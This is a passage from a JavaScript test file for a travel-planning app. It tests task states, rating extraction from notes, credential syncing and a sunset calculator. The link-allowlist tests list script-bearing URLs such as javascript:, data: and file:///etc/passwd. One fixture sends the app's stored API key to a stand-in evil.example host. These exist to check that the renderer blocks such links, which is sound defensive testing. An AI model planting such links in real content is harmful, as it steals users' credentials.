    { id: 't-done', section: 'tasks', status: 'done', name: 'Buy a SIM', links: [] },
    { id: 't-no', section: 'tasks', status: 'archived', name: 'Day trip to Kruje', links: [] },
    { id: 'd1', section: 'dinner', status: 'plan', day: '2026-08-23', name: 'Somewhere', links: [] }
  ]
};

test('planModel splits tasks three ways: open, done and declined', () => {
  const pm = C.planModel(clone(TASKY), C.normalizeState({}), '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), ['t-open']);
  assert.deepEqual(pm.doneTasks.map((e) => e.it.id), ['t-done']);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
  assert.equal(pm.declinedTasks[0].status, 'archived');
});

test('declining a task moves it out of open and into declined, and restoring reverses it', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setStatus(st, 't-open', 'archived');
  let pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), []);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id).sort(), ['t-no', 't-open']);
  // Every state is reachable from every other: back to open, then to done.
  C.setStatus(st, 't-open', 'plan');
  pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), ['t-open']);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
  C.setStatus(st, 't-open', 'done');
  pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.doneTasks.map((e) => e.it.id).sort(), ['t-done', 't-open']);
});

test('declining does not invent a status: archived is the only value written', () => {
  const st = C.normalizeState({});
  C.setStatus(st, 't-open', 'archived');
  assert.equal(st.itemStatus['t-open'], 'archived');
  assert.throws(() => C.setStatus(st, 't-open', 'declined'));
});

test('a declined task that carries a day still surfaces, so it is never a dead end', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setDay(st, 't-open', '2026-08-23');
  C.setStatus(st, 't-open', 'archived');
  const pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id).sort(), ['t-no', 't-open']);
  // And it is not also sitting in the day group it used to be in.
  const wed = pm.days.filter((d) => d.iso === '2026-08-23')[0];
  assert.equal(wed.items.filter((e) => e.it.id === 't-open').length, 0);
});

test('declined tasks come only from task sections, never from a dinner list', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setStatus(st, 'd1', 'archived');
  const pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
});

test('buildRatingsPassPrompt echoes existing intel so a takeaway cannot delete it', () => {
  const city = clone(GOOD);
  city.items[0].intel = {
    verdicts: [{ tier: 'must', text: 'The duck is the reason to come' }],
    tips: ['Ask for the terrace'],
    source: 'Google Maps reviews, Jul 2026'
  };
  const out = C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('    existing verdict (must): The duck is the reason to come'));
  assert.ok(out.includes('    existing tip: Ask for the terrace'));
  assert.ok(out.includes('    existing intel source: Google Maps reviews, Jul 2026'));
  // An item with no intel costs no extra lines at all.
  assert.equal(out.indexOf('- tanini | dinner | Tanini\n    existing'), -1);
  assert.ok(out.includes('Indented lines under an item are the intel it already holds'));
});

test('the real PROMPT.md ratings pass asks for at most one notable review takeaway', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const out = C.promptKit.buildRatingsPassPrompt(prompt, GOOD);
  assert.ok(out.includes('At most one per item, and only when it would change a decision.'));
  assert.ok(out.includes('`intel` REPLACES an item\'s whole existing intel block.'));
  assert.ok(out.includes('"intel": {'));
  // The takeaway rides the existing intel map, so mergeDelta needs no new
  // machinery: the shape the contract shows must be one mergeDelta accepts.
  const r = C.mergeDelta(clone(GOOD), {
    schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.7, checked: '2026-08-25' } },
    intel: { nord: { tips: ['Reviewers say the terrace is the quiet half.'],
      source: 'Google Maps reviews, Aug 2026' } }
  });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.ratingsApplied, 1);
  assert.equal(r.summary.intelApplied, 1);
  assert.equal(r.data.items[3].intel.tips[0], 'Reviewers say the terrace is the quiet half.');
});

// ---- tools/extract-ratings.js: prose to structured data ----
// Every case below is a real note shape from cities/tirana.json,
// cities/yerevan.json or cities/batumi.json.
test('extractRating reads every rating shape the shipped guides actually use', () => {
  const { extractRating } = require('../tools/extract-ratings');
  function r(note) { return extractRating(note).rating; }
  assert.deepEqual(r('4.8 stars across 442 reviews, the highest-rated place nearby.'),
    { stars: 4.8, count: 442, source: 'from generation research' });
  assert.equal(r('4.5 stars, 252 reviews. Air conditioning.').count, 252);
  assert.equal(r('4.6★ across 5,545 reviews - the broadest menu.').count, 5545);
  assert.equal(r('Rruga e Bogdaneve 25 · 4.9★ (38).').count, 38);
  assert.equal(r('Dropped, 3.6★ on only 7 reviews.').count, 7);
  assert.equal(r('4.9 stars but only 76 reviews, so treat that as soft.').count, 76);
  assert.equal(r('4.5 stars across roughly 1,000 reviews.').count, 1000);
  assert.equal(r('4.5 stars across about 405 reviews.').count, 405);
  assert.equal(r('4.6 stars across 250 ratings.').count, 250);
  assert.equal(r('4.5 stars and 1,833 reviews for the park, 4.6 and 607 for the statue.').count, 1833);
  // The FIRST rating wins when a note compares two sources or two branches.
  assert.deepEqual(r('4.5 stars across 370 Google reviews and 4.9 across 177 Yandex ratings.'),
    { stars: 4.5, count: 370, source: 'from generation research' });
  // Stars with no count at all: the count key is simply absent.
  assert.deepEqual(r('Drop-off dry cleaning. 4.5 stars. Opens 09:00.'),
    { stars: 4.5, source: 'from generation research' });
  assert.deepEqual(r("Was Plan A in v1; it's 4.2★ and has become a tourist cafe."),
    { stars: 4.2, source: 'from generation research' });
});

test('extractRating never guesses an ambiguous reading', () => {
  const { extractRating } = require('../tools/extract-ratings');
  // A star RANGE gives no rating at all: picking one end invents precision.
  assert.equal(extractRating('About 4.5 to 4.6 stars across roughly 140 Google reviews.').rating, null);
  // A count range gives the stars and drops the count.
  assert.deepEqual(extractRating('5.0 stars across roughly 230 to 250 reviews, the best nearby.').rating,
    { stars: 5, source: 'from generation research' });
  // Nothing rating-shaped in the note, and no note at all.
  assert.equal(extractRating('Opens 08:00, runs to 02:00. 40 Pushkin.').rating, null);
  assert.equal(extractRating('').rating, null);
  assert.equal(extractRating(undefined).rating, null);
  assert.equal(extractRating(null).rating, null);
});

test('extractRating only edits the note when the clause is a whole sentence', () => {
  const { extractRating } = require('../tools/extract-ratings');
  // Whole sentence, first: it goes, and the note starts at the real content.
  const lead = extractRating('4.7 stars across 801 reviews. Armenian crossed with Lebanese.');
  assert.equal(lead.removed, true);
  assert.equal(lead.note, 'Armenian crossed with Lebanese.');
  // Whole sentence, in the middle: the sentences either side close up.
  const mid = extractRating('Drop-off dry cleaning, returned folded. 4.5 stars. Opens 09:00.');
  assert.equal(mid.removed, true);
  assert.equal(mid.note, 'Drop-off dry cleaning, returned folded. Opens 09:00.');
  // The sentence says something else too: not one character is touched.
  const rich = '4.8 stars across 442 reviews, the highest-rated substantial restaurant nearby.';
  const kept = extractRating(rich);
  assert.equal(kept.removed, false);
  assert.equal(kept.note, rich);
  assert.equal(kept.rating.stars, 4.8);
  // Mid-sentence clause, same rule: rating extracted, prose left alone.
  const inline = 'A real self-service laundromat, open 24 hours, 5.0 stars. The wash caps at an hour.';
  assert.equal(extractRating(inline).removed, false);
  assert.equal(extractRating(inline).note, inline);
  // A note that was ONLY the rating leaves no empty string behind.
  const only = extractRating('4.5 stars.');
  assert.equal(only.removed, true);
  assert.equal(only.note, null);
});

test('splitSentences round-trips byte for byte, decimals and all', () => {
  const { splitSentences } = require('../tools/extract-ratings');
  const notes = [
    '4.7 stars across 801 reviews. Armenian crossed with Lebanese and Syrian. 16 min walk.',
    'Opens 08:00 and runs to 02:00. 4.6 stars across 479 Google reviews, but Tripadvisor sits at 3.4.',
    'No terminator at the end',
    'Two branches, Hanrapetutyan 2nd Lane 17/1 and Mashtots 5/9. Carry both!'
  ];
  notes.forEach((n) => { assert.equal(splitSentences(n).join(''), n); });
  assert.equal(splitSentences('4.7 stars across 801 reviews. Armenian food.').length, 2);
});

test('the shipped cities carry structured ratings for the badge to render', () => {
  const fs = require('fs');
  const path = require('path');
  ['tirana', 'yerevan', 'batumi'].forEach((name) => {
    const city = JSON.parse(fs.readFileSync(
      path.join(__dirname, '..', 'cities', name + '.json'), 'utf8'));
    const rated = city.items.filter((it) => it.rating);
    assert.ok(rated.length > 0, name + ' has no structured ratings');
    // Whatever the extractor wrote has to pass the same validator the app
    // runs on every entry path, or the guide will not open at all.
    assert.deepEqual(C.validate(city), []);
    rated.forEach((it) => {
      assert.equal(typeof it.rating.stars, 'number');
      assert.ok(it.rating.stars > 0 && it.rating.stars <= 5, name + '/' + it.id + ' stars out of range');
      // A rating lifted out of prose says where it came from and does NOT
      // claim a check date nobody performed.
      assert.equal(typeof it.rating.source, 'string');
      assert.equal(it.rating.checked, undefined);
    });
  });
});

// ---- link scheme allowlist ----

test('safeHref allows the schemes a travel link legitimately uses', () => {
  const ok = [
    'https://maps.google.com/?cid=895365817124148954',
    'http://example.com/place',
    'HTTPS://EXAMPLE.COM',
    'tel:+995555123456',
    'mailto:hello@example.com',
    'geo:41.64,41.61',
    '/relative/path',
    'relative/path?q=1',
    '#anchor',
    'place/x:1',                 // colon inside a path, not a scheme
    '//cdn.example.com/x'        // scheme-relative: inherits http(s) here
  ];
  ok.forEach((h) => assert.equal(C.safeHref(h), h, 'should allow ' + h));
});

test('safeHref refuses every scheme that can execute or smuggle content', () => {
  const bad = [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',       // leading space is trimmed before parsing
    'java\tscript:alert(1)',         // browsers ignore control chars in a scheme
    'java\nscript:alert(1)',
    'jav ascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'blob:https://example.com/abc',
    '',
    '   ',
    null,
    undefined,
    42
  ];
  bad.forEach((h) => assert.equal(C.safeHref(h), null, 'should refuse ' + String(h)));
});

test('a hostile link in guide JSON validates but never goes live in the DOM', () => {
  // The guide is untrusted input: it is pasted from an AI, imported from a
  // file, or pulled from a sync row. This is the whole point of the
  // allowlist, so it is asserted on a city that is otherwise perfectly valid.
  const hostile = JSON.parse(JSON.stringify(GOOD));
  hostile.items[0].links = [
    { kind: 'web', label: 'Book a table', href: 'javascript:fetch("https://evil.example/"+localStorage.getItem("cityops.claude.apikey.v1"))' },
    { kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=1' }
  ];
  assert.deepEqual(C.validate(hostile), []);          // the validator still accepts it
  assert.equal(C.safeHref(hostile.items[0].links[0].href), null);   // the renderer will not
  assert.equal(C.safeHref(hostile.items[0].links[1].href), 'https://maps.google.com/?cid=1');
});

// ---- profile row: the Claude key and form metadata as stamped sidecars ----

const P_LOCAL = '2026-08-20T10:00:00.000Z';
const P_REMOTE = '2026-08-21T10:00:00.000Z';

test('buildProfileRow carries the key beside the profile, never inside it', () => {
  const row = C.syncKit.buildProfileRow(
    { interests: ['coffee'], updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-secret', updated: P_REMOTE } });
  assert.equal(row.data.apiKey.value, 'sk-ant-secret');
  assert.equal(row.data.apiKey.updated, P_REMOTE);
  assert.deepEqual(row.data.interests, ['coffee']);
  // The ROW stamp stays the profile's own: a key change must not let an
  // otherwise stale profile win a reconcile it would lose on its merits.
  assert.equal(row.updated_at, P_LOCAL);
});

test('a profile with no stamp and no sidecars still builds a row at the epoch', () => {
  const row = C.syncKit.buildProfileRow(null, null);
  assert.equal(row.updated_at, C.syncKit.EPOCH);
  assert.equal(row.data.updated, null);
  assert.equal(row.data.apiKey, undefined);   // absent, never an empty block
  assert.equal(row.data.genmeta, undefined);
});

test('a sidecar with no stamp is treated as absent, not as an empty value', () => {
  // A block with no stamp cannot be reconciled against anything, so writing
  // it would silently beat a real one on the next pull.
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-x' }, genmeta: { value: { a: { notes: 'x' } } } });
  assert.equal(row.data.apiKey, undefined);
  assert.equal(row.data.genmeta, undefined);
});

test('the Claude key cannot survive a round trip into the interest profile', () => {
  // This is the guarantee the whole design rests on: normalizeProfile rebuilds
  // from a fixed field list, so a pulled row's sidecars can never reach
  // store.profile, and from there a prompt, an export or a city row.
  const row = C.syncKit.buildProfileRow({ interests: ['ramen'], updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-secret', updated: P_LOCAL },
      genmeta: { value: { 'batumi-2026-08-08': { notes: 'top floor' } }, updated: P_LOCAL } });
  const back = C.profile.normalize(row.data);
  assert.equal(back.apiKey, undefined);
  assert.equal(back.genmeta, undefined);
  assert.deepEqual(Object.keys(back).sort(),
    ['avoid', 'factors', 'interests', 'notes', 'schema', 'showExample', 'updated']);
  // And the prompt built from that profile carries no trace of either.
  const prompt = C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, back);
  assert.equal(prompt.indexOf('sk-ant-secret'), -1);
  assert.equal(prompt.indexOf('top floor'), -1);
});

test('an exported guide carries no sidecar, because the export never sees one', () => {
  const out = C.buildExport(GOOD, C.emptyState());
  assert.equal(JSON.stringify(out).indexOf('apiKey'), -1);
  assert.equal(JSON.stringify(out).indexOf('sk-ant'), -1);
});

// ---- the GitHub token sidecar (the trip surface's publish credential) ----

test('the GitHub token rides as its own stamped sidecar, on its own stamp', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, {
    apiKey: { value: 'sk-ant-x', updated: P_LOCAL },
    github: { value: 'github_pat_secret', updated: P_REMOTE }
  });
  assert.deepEqual(row.data.github, { value: 'github_pat_secret', updated: P_REMOTE });
  // The row's own stamp stays the PROFILE's: a token change must not make a
  // stale interest profile win the next reconcile.
  assert.equal(row.updated_at, P_LOCAL);
  // And it comes back out the same way, so a pull can reconcile it alone.
  assert.deepEqual(C.syncKit.readSidecars(row.data).github,
    { value: 'github_pat_secret', updated: P_REMOTE });
});

test('a GitHub token cannot reach the interest profile, a prompt or an export', () => {
  const row = C.syncKit.buildProfileRow({ interests: ['ramen'], updated: P_LOCAL },
    { github: { value: 'github_pat_secret', updated: P_LOCAL } });
  const back = C.profile.normalize(row.data);
  assert.equal(back.github, undefined);
  assert.deepEqual(Object.keys(back).sort(),
    ['avoid', 'factors', 'interests', 'notes', 'schema', 'showExample', 'updated']);
  assert.equal(C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, back)
    .indexOf('github_pat_secret'), -1);
});

test('an unstamped GitHub token is absent, exactly like an unstamped key', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, { github: { value: 'github_pat_x' } });
  assert.equal(row.data.github, undefined);
});

// ---- mergeProfileRow: the trip surface pushes credentials, never a profile ----

test('mergeProfileRow keeps the account profile and its stamp untouched', () => {
  // The trip surface has no Profile UI, so it has no opinion about interests.
  // A PostgREST upsert replaces the whole row, so "no opinion" must mean
  // "write back exactly what was there", not "write a blank".
  const row = {
    data: { schema: 1, interests: ['ramen', 'ruins'], avoid: ['clubs'], factors: [],
            notes: 'quiet mornings', showExample: false, updated: P_REMOTE },
    updated_at: P_REMOTE
  };
  const out = C.syncKit.mergeProfileRow(row, { github: { value: 'github_pat_new', updated: P_LOCAL } });
  assert.deepEqual(out.data.interests, ['ramen', 'ruins']);
  assert.deepEqual(out.data.avoid, ['clubs']);
  assert.equal(out.data.notes, 'quiet mornings');
  assert.equal(out.data.updated, P_REMOTE);
  assert.equal(out.updated_at, P_REMOTE);
  assert.deepEqual(out.data.github, { value: 'github_pat_new', updated: P_LOCAL });
});

test('mergeProfileRow carries forward every sidecar it was not given', () => {
  // The trip surface knows nothing about genmeta. Dropping it would delete the
  // account's Add/Edit form metadata on the first credential push.
  const row = {
    data: {
      schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: P_REMOTE,
      apiKey: { value: 'sk-ant-account', updated: P_REMOTE },
      genmeta: { value: { 'batumi-2026-08-08': { notes: 'top floor' } }, updated: P_REMOTE }
    },
    updated_at: P_REMOTE
  };
  const out = C.syncKit.mergeProfileRow(row, { github: { value: 'github_pat_new', updated: P_LOCAL } });
  assert.deepEqual(out.data.apiKey, { value: 'sk-ant-account', updated: P_REMOTE });
  assert.deepEqual(out.data.genmeta.value, { 'batumi-2026-08-08': { notes: 'top floor' } });
  assert.deepEqual(out.data.github, { value: 'github_pat_new', updated: P_LOCAL });
});

test('mergeProfileRow is newest-wins per credential, both directions', () => {
  const row = {
    data: { updated: P_REMOTE, apiKey: { value: 'sk-account-newer', updated: P_REMOTE } },
    updated_at: P_REMOTE
  };
  // P_LOCAL is older than P_REMOTE, so the account's key survives...
  const older = C.syncKit.mergeProfileRow(row, { apiKey: { value: 'sk-device-older', updated: P_LOCAL } });
  assert.equal(older.data.apiKey.value, 'sk-account-newer');
  // ...and a genuinely newer device key replaces it.
  const newer = C.syncKit.mergeProfileRow(row, { apiKey: { value: 'sk-device-newer', updated: '2030-01-01T00:00:00.000Z' } });
  assert.equal(newer.data.apiKey.value, 'sk-device-newer');
});

test('mergeProfileRow against no row at all still writes the credential', () => {
  const out = C.syncKit.mergeProfileRow(null, { github: { value: 'github_pat_first', updated: P_LOCAL } });
  assert.deepEqual(out.data.github, { value: 'github_pat_first', updated: P_LOCAL });
  assert.deepEqual(out.data.interests, []);
  assert.equal(out.updated_at, C.syncKit.EPOCH);   // no profile edit is being claimed
});

test('sidecarsWorthPushing says no when the account already has it all', () => {
  const row = {
    data: { updated: P_REMOTE, apiKey: { value: 'sk', updated: P_REMOTE },
            github: { value: 'gh', updated: P_REMOTE } },
    updated_at: P_REMOTE
  };
  assert.equal(C.syncKit.sidecarsWorthPushing(row, {
    apiKey: { value: 'sk', updated: P_REMOTE }, github: { value: 'gh', updated: P_REMOTE }
  }), false);
  // A device with nothing never pushes emptiness over a real credential.
  assert.equal(C.syncKit.sidecarsWorthPushing(row, { apiKey: null, github: null }), false);
  // A newer one does.
  assert.equal(C.syncKit.sidecarsWorthPushing(row, {
    github: { value: 'gh2', updated: '2030-01-01T00:00:00.000Z' }
  }), true);
  // And so does a credential the account has never seen: this is the case that
  // carries a token out of the old trip blob and up to the account.
  assert.equal(C.syncKit.sidecarsWorthPushing(null, {
    github: { value: 'gh', updated: C.syncKit.EPOCH }
  }), true);
});

// ---- the trip surface's credential migration ----
// stripCredentialsFromBlob lives in src/trip-shell.html (it needs localStorage),
// so what is pinned here is the shape contract it enforces: whatever the trip
// blob is, the credential fields are not in it, and the built page never
// mentions them as state.
test('the built trip page keeps no credential in its trip state shape', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip.html'), 'utf8');
  // defaultState() is the whole contract: a field that is not there cannot be
  // rehydrated by Object.assign from a pulled or imported blob.
  const def = trip.match(/function defaultState\(\) \{[\s\S]*?\n\}/);
  assert.ok(def, 'defaultState missing from the built trip page');
  assert.ok(!/\bapiKey\s*:/.test(def[0]), 'apiKey is back in the trip state');
  assert.ok(!/\bgithubToken\s*:/.test(def[0]), 'githubToken is back in the trip state');
  // Nothing anywhere reads a credential off `state` any more.
  assert.equal(trip.indexOf('state.apiKey'), -1);
  assert.equal(trip.indexOf('state.githubToken'), -1);
  // The migration runs on load, on pull, on restore and on import: all four
  // doors a blob can come through.
  assert.ok(trip.indexOf('stripCredentialsFromBlob') !== -1);
  assert.ok((trip.match(/stripCredentialsFromBlob\(/g) || []).length >= 5);
});

test('the built trip page reads the shared session key, not its own', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip.html'), 'utf8');
  assert.ok(/const AUTH_KEY = 'cityops\.auth\.v1'/.test(trip),
    'the trip surface must share the city app session key');
  // And it carries no sign-in flow of its own: one GoTrue redirect URL.
  assert.equal(trip.indexOf('/auth/v1/otp'), -1, 'the trip surface must not send magic links');
});

test('the published family page is built from a fixed field list', () => {
  // The family page is public. It is built by naming the fields that go into
  // it, not by filtering a copy of the state, which is why no credential can
  // reach it even if one somehow got back into the blob.
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip.html'), 'utf8');
  const fn = trip.match(/function buildFamilyShareForCurrentState\(\) \{[\s\S]*?\n\}/);
  assert.ok(fn, 'buildFamilyShareForCurrentState missing from the built trip page');
  assert.equal(fn[0].indexOf('apiKey'), -1);
  assert.equal(fn[0].indexOf('githubToken'), -1);
  assert.equal(fn[0].indexOf('credGet'), -1);
  // The payload names exactly what family sees.
  assert.ok(/travelerName:/.test(fn[0]) && /cities: cities/.test(fn[0]) && /transitions: transitions/.test(fn[0]));
});

test('the built trip page is the engine plus the shell, and nothing else', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const engine = fs.readFileSync(path.join(root, 'src', 'cityops.js'), 'utf8');
  const trip = fs.readFileSync(path.join(root, 'trip.html'), 'utf8');
  assert.ok(trip.includes(engine), 'run node tools/assemble.js after editing src/');
  // The seam links are same-origin: a cross-domain hop here would put the two
  // halves back on two origins and split the session again.
  assert.ok(/const CITYOPS_BASE = '\.'/.test(trip));
  assert.equal(trip.indexOf('https://cityops.robriggs.com/#city='), -1);
});

test('readSidecars tolerates every shape a stored row can be in', () => {
  const none = { apiKey: null, github: null, genmeta: null };
  assert.deepEqual(C.syncKit.readSidecars(null), none);
  assert.deepEqual(C.syncKit.readSidecars({}), none);
  assert.deepEqual(C.syncKit.readSidecars({ apiKey: 'sk-ant-loose' }), none);
  assert.deepEqual(C.syncKit.readSidecars({ apiKey: [] }), none);
  const good = C.syncKit.readSidecars({ apiKey: { value: 'sk', updated: P_LOCAL } });
  assert.deepEqual(good.apiKey, { value: 'sk', updated: P_LOCAL });
  // A cleared key is a real value: it has to propagate, so an empty string
  // with a stamp is a usable block, not an absent one.
  const cleared = C.syncKit.readSidecars({ apiKey: { value: '', updated: P_LOCAL } });
  assert.deepEqual(cleared.apiKey, { value: '', updated: P_LOCAL });
});

test('genmeta normalizes to string fields per city and stays bounded', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, {
    genmeta: {
      updated: P_LOCAL,
      value: {
        'batumi-2026-08-08': { country: 'GE', notes: 'x'.repeat(5000), bad: { nested: 1 } },
        'junk': 'not an object',
        '': { notes: 'no city id' }
      }
    }
  });
  const gm = row.data.genmeta.value;
  assert.deepEqual(Object.keys(gm), ['batumi-2026-08-08']);
  assert.equal(gm['batumi-2026-08-08'].country, 'GE');
  assert.equal(gm['batumi-2026-08-08'].notes.length, 2000);
  assert.equal(gm['batumi-2026-08-08'].bad, undefined);
});

test('an oversized key value is bounded rather than pushed whole', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
    { apiKey: { value: 'k'.repeat(9999), updated: P_LOCAL } });
  assert.equal(row.data.apiKey.value.length, 4000);
});

// ---- token refresh: transient failure must not sign a device out ----

test('refreshFailure only calls a grant dead when the body says so', () => {
  // The first entry is the body the live project actually returned for a
  // bogus refresh token on 2026-08-25. It is here because the first version
  // of this classifier did not match it: a genuinely revoked session would
  // have kept retrying forever and never told the traveler sync had stopped.
  const dead = [
    [400, '{"code":400,"error_code":"validation_failed","msg":"Refresh token is not valid"}'],
    [400, '{"code":400,"error_code":"refresh_token_not_found","msg":"Invalid Refresh Token: Refresh Token Not Found"}'],
    [400, '{"code":400,"error_code":"refresh_token_already_used","msg":"Invalid Refresh Token: Already Used"}'],
    [400, '{"error":"invalid_grant","error_description":"Invalid Refresh Token"}'],
    [401, '{"error":"invalid_grant"}'],
    [403, '{"error":"invalid_grant"}']
  ];
  dead.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'dead',
    'should be dead: ' + s + ' ' + b));
  const transient = [
    [403, '{"message":"Project is paused"}'],
    [429, '{"message":"rate limit"}'],
    [500, ''],
    [502, 'bad gateway'],
    [503, '{"error":"unavailable"}'],
    [400, ''],                                  // unreadable body: keep the session
    [401, '{"message":"No API key found in request"}'],
    [404, '{"message":"not found"}'],
    [undefined, '']
  ];
  transient.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'transient',
    'should be transient: ' + s + ' ' + b));
});


// ---- the More action sheet's clustering (pure; the DOM builder renders it) ----

test('moreSheetGroups clusters rows and orders each cluster by its own order', () => {
  const rows = [
    { label: 'Share view', group: 'share', order: 10 },
    { label: 'Export JSON', group: 'share', order: 30 },
    { label: 'Update data', group: 'work', order: 20 },
    { label: 'Edit dates', group: 'work', order: 30 },
    { label: 'Enrich', group: 'work', order: 10 },
    { label: 'Export guide', group: 'share', order: 20 },
    { label: 'Edit city', group: 'city', order: 10 },
    { label: 'Remove city', group: 'city', order: 20, cls: 'danger' }
  ];
  const gs = C.moreSheetGroups(rows);
  assert.deepEqual(gs.map(g => g.id), ['work', 'share', 'city']);
  assert.deepEqual(gs.map(g => g.label), C.MORE_GROUPS.map(g => g.label));
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Enrich', 'Update data', 'Edit dates']);
  assert.deepEqual(gs[1].rows.map(r => r.label), ['Share view', 'Export guide', 'Export JSON']);
  assert.deepEqual(gs[2].rows.map(r => r.label), ['Edit city', 'Remove city']);
  // The destructive row is the last row of the last group, every time.
  const last = gs[gs.length - 1].rows[gs[gs.length - 1].rows.length - 1];
  assert.equal(last.cls, 'danger');
});

test('a standalone guide drops the empty app-only cluster', () => {
  // No CityOpsApp: only the four engine rows exist, so 'city' never renders
  // and the other two keep the same order they have in the app.
  const gs = C.moreSheetGroups([
    { label: 'Share view', group: 'share', order: 10 },
    { label: 'Export JSON', group: 'share', order: 30 },
    { label: 'Update data', group: 'work', order: 20 },
    { label: 'Edit dates', group: 'work', order: 30 }
  ]);
  assert.deepEqual(gs.map(g => g.id), ['work', 'share']);
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Update data', 'Edit dates']);
  assert.deepEqual(gs[1].rows.map(r => r.label), ['Share view', 'Export JSON']);
});

test('a row with no group is shown, never dropped', () => {
  const gs = C.moreSheetGroups([
    { label: 'Enrich', group: 'work', order: 10 },
    { label: 'Mystery' },
    { label: 'Remove city', group: 'city', order: 20, cls: 'danger' }
  ]);
  const shown = [].concat.apply([], gs.map(g => g.rows.map(r => r.label)));
  assert.ok(shown.indexOf('Mystery') !== -1, 'an ungrouped row must still render');
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Enrich', 'Mystery']);
  assert.equal(shown[shown.length - 1], 'Remove city');
});


// ---------------------------------------------------------------------------
// Header highlights, feature A: sunset
// ---------------------------------------------------------------------------
// The reference column is api.met.no (the Norwegian Meteorological Institute's
// sunrise API), queried once by hand for each row and pasted here so the test
// makes no network call of its own. met.no reports to the minute; the tolerance
// below is 90 seconds, which is NOAA's own stated accuracy for latitudes under
// 72 degrees plus met.no's own rounding. Every row here agreed to within a
// single minute when the implementation landed.
const SUNSET_CASES = [
  // [label, iso, lat, lng, met.no sunset UTC 'HH:MM']
  ['Tirana, the owner\'s city, late August', '2026-08-26', 41.33, 19.8101, '17:23'],
  ['Ksamil, the next stop', '2026-08-30', 39.7686, 20.0042, '17:14'],
  ['Batumi', '2026-08-10', 41.64, 41.61, '16:20'],
  ['Yerevan', '2026-08-18', 40.17, 44.52, '15:55'],
  ['the equator on the March equinox', '2026-03-20', 0, 0, '18:10'],
  ['Greenwich on the June solstice', '2026-06-21', 51.4779, 0, '20:20'],
  ['Sydney on the December solstice', '2026-12-21', -33.8688, 151.2093, '09:05']
];

test('sunsetUtcMinutes matches published sunset times within 90 seconds', () => {
  SUNSET_CASES.forEach(([label, iso, lat, lng, ref]) => {
    const got = C.sunKit.sunsetUtcMinutes(iso, lat, lng);
    assert.equal(typeof got, 'number', label + ': expected a time');
    const want = (+ref.slice(0, 2)) * 60 + (+ref.slice(3, 5));
    const offBySeconds = Math.abs(got - want) * 60;
    assert.ok(offBySeconds <= 90,
      label + ': got ' + got.toFixed(2) + ' min UTC, met.no says ' + ref +
      ' (' + want + '), off by ' + offBySeconds.toFixed(0) + 's');
  });
});

test('Tirana in late August sets just after 19:20 local, which is what the chip shows', () => {
  // The owner's own sanity check: "Tirana late Aug sunset ~19:3x local".
  // Albania runs UTC+2 in August, so the chip reads the UTC answer plus two
  // hours. Asserted as a range rather than a string because the chip renders
  // on the DEVICE clock and this test has no device timezone to speak for.
  const utcMin = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  const localMin = utcMin + 120;
  assert.ok(localMin > 19 * 60 + 15 && localMin < 19 * 60 + 35,
    'expected roughly 19:20-19:30 local, got ' + Math.floor(localMin / 60) + ':' +
    Math.round(localMin % 60));
});

test('sunset shortens through the stay, which is the whole reason it is a daily chip', () => {
  const first = C.sunKit.sunsetUtcMinutes('2026-08-22', 41.33, 19.8101);
  const last = C.sunKit.sunsetUtcMinutes('2026-08-29', 41.33, 19.8101);
  assert.ok(last < first, 'late August evenings get shorter, not longer');
  // Roughly 10 minutes over the week at this latitude; a wildly different
  // number would mean the declination term is wrong even if one date matches.
  const lost = first - last;
  assert.ok(lost > 6 && lost < 16, 'expected 6-16 minutes lost over the week, got ' + lost.toFixed(1));
});

test('a polar day has no sunset, and that is an answer rather than an error', () => {
  // Longyearbyen at midsummer: met.no returns no sunset at all for this date.
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-06-21', 78.22, 15.65), null);
